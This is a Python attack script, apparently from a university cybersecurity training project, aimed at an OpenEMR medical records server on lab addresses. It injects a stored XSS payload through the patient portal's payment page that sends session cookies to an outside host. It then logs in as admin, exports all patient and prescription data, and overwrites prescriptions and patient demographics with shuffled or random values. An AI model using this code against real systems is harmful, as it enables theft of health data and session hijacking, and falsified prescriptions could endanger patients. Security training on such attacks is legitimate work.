# =============================================================================
# Project Name: DisruptionAndExfiltrationOpenEMR
# File: DEOE
# Description: Disruption and exfiltration within OpenEMR
#
# Copyright (c) 2026 Christophe SUBLET, Grenoble INP - Esisar, UGA, CyberSkills@UGA
#
# This file is part of DisruptionAndExfiltrationOpenEMR
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# =============================================================================

from urllib.request import Request, urlopen, build_opener, HTTPSHandler, HTTPRedirectHandler, HTTPError
from ssl import _create_unverified_context
from datetime import date, timedelta
from collections import defaultdict
from random import randint, choice
from csv import DictReader
from socket import socket
from io import StringIO
from re import search

HOST = '192.168.56.102:8443'
URLBASE = f'https://{HOST}'
URLBASE = f'http://172.20.0.10'

context = _create_unverified_context()
login = 'Charlie'
password = 'Toto123!{}'
login = 'admin'
password = 'pass'

headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "fr,fr-FR;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Priority": "u=0, i",
        "Referer": URLBASE + "/interface/login/login.php?site=default",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0",
}

firstnames = list({
    "Aaron", "Abel", "Adam", "Adrien", "Alexandre", "Alexis",
    "Alban", "Albert", "Alessandro", "Alex", "Alfred", "Ali",
    "Amaury", "Ambroise", "André", "Angelo", "Antoine", "Armand",
    "Arthur", "Augustin", "Aurélien", "Axel",
    "Baptiste", "Bastien", "Benjamin", "Bernard", "Benoît", "Brice",
    "Bruno",
    "Cédric", "Charles", "Christian", "Christophe", "Clément",
    "Corentin", "Constantin", "Cyprien",
    "Damien", "Daniel", "David", "Denis", "Dimitri", "Dorian",
    "Edgar", "Edmond", "Édouard", "Eliott", "Emmanuel", "Émile",
    "Enzo", "Erwan", "Esteban", "Ethan", "Étienne", "Eugène",
    "Fabien", "Fabrice", "Félix", "Fernand", "Florian", "François",
    "Gabriel", "Gaël", "Gaspard", "Gaston", "Geoffrey", "Georges",
    "Gérard", "Gilles", "Grégoire", "Guillaume",
    "Hadrien", "Hector", "Henri", "Hervé", "Hugo",
    "Igor", "Isaac", "Ismaël", "Ivan",
    "Jacques", "Jérémie", "Jérôme", "Joachim", "Johan", "Jonathan",
    "Joseph", "Jules", "Julien", "Justin",
    "Kévin", "Killian", "Kylian",
    "Laurent", "Léandre", "Léo", "Léon", "Léonard", "Lionel",
    "Loïc", "Louis", "Lucas", "Luc", "Lucien",
    "Marc", "Marcel", "Marius", "Martin", "Mathias", "Mathieu",
    "Maxence", "Maxime", "Michel", "Morgan",
    "Nathan", "Nicolas", "Noah", "Noé", "Norbert",
    "Octave", "Olivier", "Oscar",
    "Pascal", "Patrice", "Paul", "Philippe", "Pierre",
    "Quentin",
    "Raphaël", "Rémi", "Renaud", "Richard", "Robert", "Robin",
    "Romain", "Ronan", "Rudy",
    "Samuel", "Sébastien", "Serge", "Simon", "Sofiane", "Stéphane",
    "Sylvain",
    "Théo", "Théodore", "Thomas", "Timothée", "Tristan",
    "Ulysse",
    "Valentin", "Valère", "Victor", "Vincent",
    "William",
    "Xavier",
    "Yann", "Yanis", "Yoann",
    "Zacharie", "Zéphyr"
})

lastnames = list({
    "Martin", "Bernard", "Thomas", "Petit", "Robert", "Richard",
    "Durand", "Dubois", "Moreau", "Laurent", "Simon", "Michel",
    "Lefebvre", "Leroy", "Roux", "David", "Bertrand", "Morel",
    "Fournier", "Girard", "Bonnet", "Dupont", "Lambert", "Fontaine",
    "Rousseau", "Vincent", "Muller", "Lefèvre", "Faure", "André",
    "Mercier", "Blanc", "Guerin", "Boyer", "Garnier", "Chevalier",
    "François", "Legrand", "Gauthier", "Garcia", "Perrin", "Robin",
    "Clement", "Morin", "Nicolas", "Henry", "Roussel", "Mathieu",
    "Gautier", "Masson", "Marchand", "Duval", "Denis", "Dumont",
    "Marie", "Lemaire", "Noël", "Meyer", "Dufour", "Meunier",
    "Brun", "Blanchard", "Giraud", "Joly", "Rivière", "Lucas",
    "Brunet", "Gaudin", "Arnaud", "Barbier", "Gerard", "Martinez",
    "Bailly", "Leclerc", "Renault", "Colin", "Vidal",
    "Caron", "Picard", "Roger", "Fabre", "Aubry", "Lecomte",
    "Renaud", "Lacroix", "Hubert", "Besson", "Delorme", "Poirier",
    "Lemoine", "Jacob", "Monnier", "Adam", "Guillet", "Perrier",
    "Moulin", "Gaillard", "Bouvier", "Lejeune", "Renard", "Germain",
    "Rodriguez", "Marty", "Dupuis", "Olivier", "Gillet", "Delattre",
    "Royer", "Paris", "Allard", "Cousin", "Gomes", "Bouchet", "Louis",
    "Deschamps", "Schmitt", "Maillard", "Pasquier", "Ménard",
    "Philippe", "Fernandez", "Boucher", "Dufresne", "Michaud",
    "Legros", "Vasseur", "Lamy", "Baron", "Guillaume", "Perrot",
    "Le Goff", "Chauvin", "Bodin", "Peltier", "Hardy", "Legendre",
    "Briand", "Charpentier", "Marchal", "Rousset", "Leconte",
    "Poulain", "Langlois", "Benard", "Carlier", "Prevost", "Gros",
    "Leclercq", "Guyon", "Mahe", "Blin", "Devaux", "Lopez", "Dumas",
    "Lenoir", "Mallet", "Barbe", "Perret", "Collet", "Jacquet",
    "Vallet", "Pichon", "Lebrun", "Guilbert", "Chauvet", "Rey",
    "Reynaud", "Hervé", "Lombard", "Benoit", "Delmas", "Roussel",
    "Oudin", "Guillot", "Fleury", "Chevrier", "Roche", "Rolland",
    "Boutin", "Baillet", "Berger", "Maury", "Renaudin", "Boulay"
})

drugs = [
    "Aspirin",
    "Ibuprofen",
    "Paracetamol",
    "Naproxen",
    "Diclofenac",
    "Ketoprofen",
    "Amoxicillin",
    "Azithromycin",
    "Ciprofloxacin",
    "Doxycycline",
    "Clarithromycin",
    "Cephalexin",
    "Metronidazole",
    "Penicillin",
    "Clindamycin",
    "Metformin",
    "Glimepiride",
    "Gliclazide",
    "Sitagliptin",
    "Empagliflozin",
    "Lisinopril",
    "Losartan",
    "Amlodipine",
    "Atenolol",
    "Metoprolol",
    "Bisoprolol",
    "Furosemide",
    "Hydrochlorothiazide",
    "Atorvastatin",
    "Simvastatin",
    "Rosuvastatin",
    "Omeprazole",
    "Pantoprazole",
    "Esomeprazole",
    "Famotidine",
    "Cetirizine",
    "Loratadine",
    "Fexofenadine",
    "Diphenhydramine",
    "Salbutamol",
    "Budesonide",
    "Fluticasone",
    "Montelukast",
    "Prednisone",
    "Dexamethasone",
    "Hydrocortisone",
    "Levothyroxine",
    "Sertraline",
    "Fluoxetine",
    "Escitalopram",
    "Citalopram",
    "Venlafaxine",
    "Duloxetine",
    "Mirtazapine",
    "Quetiapine",
    "Risperidone",
    "Olanzapine",
    "Aripiprazole",
    "Gabapentin",
    "Pregabalin",
    "Carbamazepine",
    "Valproic acid",
    "Lamotrigine",
    "Sumatriptan",
    "Ondansetron",
    "Domperidone",
    "Loperamide",
    "Bisacodyl",
    "Lactulose",
    "Polyethylene glycol",
    "Tamsulosin",
    "Finasteride",
    "Sildenafil",
    "Tadalafil",
    "Acyclovir",
    "Valacyclovir",
    "Fluconazole",
    "Clotrimazole",
    "Miconazole",
    "Warfarin",
    "Heparin",
    "Apixaban",
    "Rivaroxaban",
    "Clopidogrel",
    "Nitroglycerin",
    "Digoxin",
    "Amiodarone",
    "Morphine",
    "Tramadol",
    "Codeine",
    "Oxycodone",
    "Fentanyl",
    "Lidocaine",
    "Bupivacaine",
    "Propofol",
    "Ketamine",
    "Midazolam",
    "Diazepam",
    "Lorazepam"
]

class IdentityGenerator:
    def __init__(self, first_names, last_names):
        self.first_names = list(dict.fromkeys(first_names))
        self.last_names = list(dict.fromkeys(last_names))

        if not self.first_names:
            raise ValueError("first name list was empty")

        if not self.last_names:
            raise ValueError("last name list was empty")

        self.index = 0
        self.rotation = 0
        self.rotation_size = len(self.first_names)
        self.total = self.rotation_size * len(self.last_names)
        self.counter = 0

    def __next__(self):
        index_first_name = self.index
        index_last_name = (self.index + self.rotation) % len(self.last_names)

        first_name = self.first_names[index_first_name]
        last_name = self.last_names[index_last_name]
        self.index += 1
        if self.index >= len(self.first_names):
            self.index = 0
            self.rotation += 1
            if self.rotation >= len(self.last_names):
                self.rotation = 0

        self.counter += 1
        return first_name, last_name

class NoRedirectHandler(HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        return fp

opener = build_opener(HTTPSHandler(context=context), NoRedirectHandler)
today = date.today()
start = date(1980, 1, 1)

r = urlopen(Request(URLBASE + '/portal/', headers=headers), context=context)
response_headers = r.getheaders()
for header, value in response_headers:
    if header == 'Set-Cookie':
        cookie = value.split(';')[0]
        break

portal_headers = headers.copy()
portal_headers['Cookie'] = cookie
portal_headers["Referer"] = "http://172.20.0.10/portal/index.php?site=default"
portal_headers["Content-Type"] = "application/x-www-form-urlencoded"
portal_headers["Origin"] = "http://172.20.0.10"
portal_headers["DNT"] = "1"
portal_headers["Sec-GPC"] = "1"
url = URLBASE + "/portal/get_patient_info.php"
with opener.open(Request(url, data=b'redirect=&uname=CorentinBrun47&pass=nSrKKhQme%23n1&languageChoice=1', headers=portal_headers)) as request:
    response_headers = request.getheaders()
    for header, value in response_headers:
        if header == 'Set-Cookie':
            cookie = value.split(';')[0]
            break
    request.read()

portal_headers['Cookie'] = cookie + '; App=PortalOpenEMR'
urlopen(Request(URLBASE + "/portal/lib/paylib.php?site=default", data=b"mode=portal-save&form_pid=47&inv_values=';window.location='http://172.20.0.1:8000/?'%2bdocument.cookie;//", headers=portal_headers), context=context)

# http://172.20.0.10/portal/portal_payment.php?pid=47

url = URLBASE + "/interface/main/main_screen.php?auth=login&site=default"
with opener.open(Request(url, data=f'new_login_session_management=1&languageChoice=1&authUser={login}&clearPass={password}&languageChoice=1'.encode(), headers=headers)) as request:
    headers = request.getheaders()
    set_cookie = False
    set_location = False
    for header, value in headers:
        if header == 'Set-Cookie':
            cookie = value.split(';')[0]
            set_cookie = True
            if set_location:
                break
        elif header == "Location":
            location = value
            token = location.split('?')[1].split('=')[1]
            set_location = True
            if set_cookie:
                break
    else:
        print('Error, cookie:', set_cookie, 'location:', set_location)

    print('Cookie', cookie, 'Token', token)

headers = {'Cookie': cookie}

with urlopen(Request(URLBASE + location, headers=headers), context=context) as request:
    token = search(b'csrf_token_form: "([0-9a-zA-Z]{40})"', request.read()).group(1).decode()
    print(token)

headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["Referer"] = URLBASE + "/interface/reports/patient_list_creation.php"
headers["Origin"] = URLBASE # "https://192.168.56.102:8443"
headers["Referer"] = URLBASE + "/interface/patient_file/summary/demographics_full.php"
headers["Priority"] = "u=4"
headers["Sec-Fetch-Dest"] = "iframe"
headers["Pragma"] = "no-cache"
headers["Cache-Control"] = "no-cache"

generator = IdentityGenerator(firstnames, lastnames)
# for a in range(100):
#     first, last = next(generator)
#     rand = randint(0, (today - start).days)
#     DOB = start + timedelta(rand)
#     r = urlopen(Request(URLBASE + "/interface/new/new_comprehensive_save.php", data=f'csrf_token_form={token}&form_fname={first}&form_lname={last}&form_DOB={DOB}&form_sex={"Female" if rand & 1 else "Male"}'.encode(), headers=headers), context=context)
#     pid = r.read().split(b'&')[0].rsplit(b'=', 1)[1].decode()
#     for a in range(randint(1, 5)):
#         urlopen(Request(URLBASE + "/controller.php?prescription&edit&id=0&pid=" + pid, data=f'escribe_flag={"on" if randint(0, 1) else "off"}&checked_formulary_flag={"on" if randint(0, 1) else "off"}&controlled_substance_flag={"on" if randint(0, 1) else "off"}&active={randint(0, 1)}&start_date={date}&provider_id={randint(1, int(pid))}&patient_id={pid}&rxcui_select=on&drug={choice(drugs)}&quantity={randint(1,7)}&size=45&unit={randint(0,9)}&dosage=test&form={randint(0,12)}&route={randint(0,12)}&interval={randint(0,20)}&refills={randint(0,20)}&per_refill=0&encounter=&usage_category=outpatient&request_intent=order&note=test&medication={randint(0,1)}&substitute={randint(0,2)}&id=0&process=true&rxnorm_drugcode=test&print_after_save='.encode(), headers=headers), context=context)

with urlopen(Request(URLBASE + '/interface/reports/patient_list_creation.php', data=f'csrf_token_form={token}&form_csvexport=true&form_refresh=true&date_from=2000-01-01+07%3A32%3A14&date_to=2050-04-03+07%3A32%3A14&srch_option=prescripts&prescription_drug=&communication=All&insurance_companies=All&encounter_type=All&observation_description=&procedure_diagnosis=&patient_id=&age_from=&age_to=&gender=&ethnicity=&form_provider=&sortby=other_date&sortorder=asc'.encode(), headers=headers), context=context) as request:
    extraction_prescriptions = request.read().decode()
print(extraction_prescriptions)

with urlopen(Request(URLBASE + '/interface/reports/patient_list_creation.php', data=f'csrf_token_form={token}&form_csvexport=true&form_refresh=true&date_from=2000-01-01+07%3A32%3A14&date_to=2050-04-03+07%3A32%3A14&srch_option=demos&prescription_drug=&communication=All&insurance_companies=All&encounter_type=All&observation_description=&procedure_diagnosis=&patient_id=&age_from=&age_to=&gender=&ethnicity=&form_provider=&sortby=patient_date&sortorder=asc'.encode(), headers=headers), context=context) as request:
    extraction_patients = request.read().decode()
print(extraction_patients)

i = 0
ids = []
csvfile = list(DictReader(StringIO(extraction_prescriptions)))

while len(ids) != len(csvfile):
    try:
        urlopen(Request(URLBASE + "/controller.php?prescription&edit&id=" + str(i), headers=headers), context=context)
    except HTTPError:
        pass
    else:
        ids.append(i)
    finally:
        i += 1

uniq_data = defaultdict(set)
for prescription in csvfile:
    for key, value in prescription.items():
        if key == "Units" or key == "Quantity" or key == "Gender":
            continue
        elif key == "Drug":
            uniq_data[key].add((value, prescription['Units'], prescription['Quantity']))
        elif key == "Patient Name":
            uniq_data[key].add((value, prescription['Gender']))
        else:
            uniq_data[key].add(value)

for key, values in uniq_data.items():
    uniq_data[key] = list(values)

for i, prescription in enumerate(csvfile):
    n, g = choice(uniq_data['Patient Name'])
    f, n = n.split(maxsplit=1)
    f = f[:-1]
    d, u, q = choice(uniq_data["Drug"])
    p = choice(uniq_data["PID"])
    s = choice(uniq_data["Filled"])
    urlopen(Request(URLBASE + f"/controller.php?prescription&edit&id={ids[i]}&pid=" + p, data=f'active=1&start_date={s}&provider_id=1&patient_id={p}&rxcui_select=on&drug={d}&quantity={q}&size=4&unit={randint(0, 9)}&dosage=test&form=2&route=2&interval=5&refills=0&per_refill=5&encounter=&usage_category=outpatient&request_intent=order&note=test&medication=0&substitute=1&id={ids[i]}&process=true&rxnorm_drugcode=test&print_after_save='.encode(), headers=headers), context=context).read()

csvfile = list(DictReader(StringIO(extraction_patients)))
uniq_data = defaultdict(set)
for patient in csvfile:
    for key, value in prescription.items():
        if key == "Gender":
            continue
        elif key == "Patient Name":
            l, f = patient[key].split(",")
            uniq_data[key].add((f.strip(), patient["Gender"]))
            uniq_data["lastname"].add(l.strip())
        else:
            uniq_data[key].add(value)

for key, values in uniq_data.items():
    uniq_data[key] = list(values)

for i, patient in enumerate(csvfile):
    f, g = choice(uniq_data['Patient Name'])
    n = choice(uniq_data["lastname"])
    rand = randint(0, (today - start).days)
    DOB = start + timedelta(rand)
    urlopen(Request(URLBASE + '/interface/patient_file/summary/demographics.php?set_pid='  + patient["PID"], headers=headers), context=context)
    with urlopen(Request(URLBASE + '/interface/patient_file/summary/demographics_save.php?pid='  + patient["PID"], data=f'csrf_token_form={token}&mode=save&db_id={patient["PID"]}&isSwapClicked=&form_title=Mrs.&form_fname={f}&form_mname=&form_lname={n}&form_suffix=&form_preferred_name=&form_birth_fname=&form_birth_mname=&form_birth_lname=&form_DOB={DOB}&form_sex={g}&form_gender_identity=&form_text_gender_identity=&form_sex_identified={g}&form_sexual_orientation=&form_text_sexual_orientation=&form_pubpid={patient["PID"]}&form_ss=&form_drivers_license=&form_status=&form_genericname1=&form_genericval1=&form_genericname2=&form_genericval2=&form_billing_note=&form_street=&form_street_line_2=&form_city=&form_state=&form_postal_code=&form_country_code=&form_county=&form_mothersname=&form_contact_relationship=&form_phone_contact=&form_phone_home=&form_phone_biz=&form_phone_cell=&form_email=&form_email_direct=&form_providerID=&form_provider_since_date=&form_ref_providerID=&form_pharmacy_id=0&form_hipaa_notice=&form_hipaa_voice=&form_hipaa_message=&form_hipaa_mail=&form_hipaa_allowsms=NO&form_hipaa_allowemail=NO&form_allow_imm_reg_use=&form_allow_imm_info_share=&form_allow_health_info_ex=&form_allow_patient_portal=&form_cmsportal_login=&form_imm_reg_status=&form_imm_reg_stat_effdate=&form_publicity_code=&form_publ_code_eff_date=&form_protect_indicator=&form_prot_indi_effdate=&form_care_team_status=&form_patient_groups%5B%5D=&form_occupation=&form_industry=&form_em_name=&form_em_street=&form_em_street_line_2=&form_em_city=&form_em_state=&form_em_postal_code=&form_em_country=&form_em_start_date=&form_em_end_date=&form_language=&form_ethnicity%5B%5D=&form_race%5B%5D=&form_nationality_country=&form_financial_review=0000-00-00+00%3A00%3A00&form_family_size=&form_monthly_income=&form_homeless=&form_interpreter_needed=&form_interpretter=&form_migrantseasonal=&form_referral_source=&form_vfc=&form_religion=&form_tribal_affiliations=&form_deceased_date=&form_deceased_reason=&form_guardiansname=&form_guardianrelationship=&form_guardiansex=&form_guardianaddress=&form_guardiancity=&form_guardianstate=&form_guardianpostalcode=&form_guardiancountry=&form_guardianphone=&form_guardianworkphone=&form_guardianemail='.encode(), headers=headers), context=context) as request:
        request.read().decode()

with urlopen(Request(URLBASE + '/interface/reports/patient_list_creation.php', data=f'csrf_token_form={token}&form_csvexport=true&form_refresh=true&date_from=2000-01-01+07%3A32%3A14&date_to=2050-04-03+07%3A32%3A14&srch_option=prescripts&prescription_drug=&communication=All&insurance_companies=All&encounter_type=All&observation_description=&procedure_diagnosis=&patient_id=&age_from=&age_to=&gender=&ethnicity=&form_provider=&sortby=other_date&sortorder=asc'.encode(), headers=headers), context=context) as request:
    changed_prescriptions = request.read().decode()
print(changed_prescriptions)

with urlopen(Request(URLBASE + '/interface/reports/patient_list_creation.php', data=f'csrf_token_form={token}&form_csvexport=true&form_refresh=true&date_from=2000-01-01+07%3A32%3A14&date_to=2050-04-03+07%3A32%3A14&srch_option=demos&prescription_drug=&communication=All&insurance_companies=All&encounter_type=All&observation_description=&procedure_diagnosis=&patient_id=&age_from=&age_to=&gender=&ethnicity=&form_provider=&sortby=patient_date&sortorder=asc'.encode(), headers=headers), context=context) as request:
    changed_patients = request.read().decode()
print(changed_patients)